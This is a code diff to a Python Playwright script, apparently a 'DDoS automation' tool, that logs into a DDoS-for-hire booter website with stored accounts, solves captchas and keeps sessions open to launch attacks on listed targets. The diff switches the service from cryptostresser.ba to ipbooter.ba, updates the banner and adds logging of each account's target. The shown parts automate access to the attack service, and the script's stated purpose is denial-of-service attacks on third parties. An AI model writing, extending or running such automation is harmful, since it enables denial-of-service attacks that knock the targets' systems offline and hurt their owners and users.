@@ -36,6 +36,7 @@ class DDoSNowManager:
                     p = line.split(":")
                     if len(p) >= 3:
                         accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
+                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
         return accounts
 
     def solve_captcha(self, page):
@@ -119,7 +120,7 @@ class DDoSNowManager:
 
                     # GİRİŞ
                     logger.info(f"[{username}] Giriş sayfası...")
-                    page.goto("https://cryptostresser.ba/login", timeout=60000)
+                    page.goto("https://ipbooter.ba/login", timeout=60000)
                     page.wait_for_load_state("networkidle")
                     time.sleep(2)
                     page.fill("input[name='username']", username)
@@ -136,7 +137,7 @@ class DDoSNowManager:
                         pass
                     
                     logger.info(f"[{username}] Hub sayfasına gidiliyor...")
-                    page.goto("https://cryptostresser.ba/hub", timeout=60000)
+                    page.goto("https://ipbooter.ba/hub", timeout=60000)
                     page.wait_for_load_state("networkidle")
                     time.sleep(2)
                     
@@ -187,7 +188,7 @@ class DDoSNowManager:
                             page.reload()
                             time.sleep(3)
                             if "/hub" not in page.url:
-                                page.goto("https://cryptostresser.ba/hub")
+                                page.goto("https://ipbooter.ba/hub")
                                 time.sleep(2)
 
                         except (PlaywrightTimeout, Exception) as inner_e:
@@ -247,7 +248,7 @@ class DDoSNowManager:
 if __name__ == "__main__":
     print("""
     ╔═══════════════════════════════════════════╗
-    ║   CRYPTOSTRESSER.BA - DDOS AUTOMATION     ║
+    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
     ╚═══════════════════════════════════════════╝
     """)
     manager = DDoSNowManager()
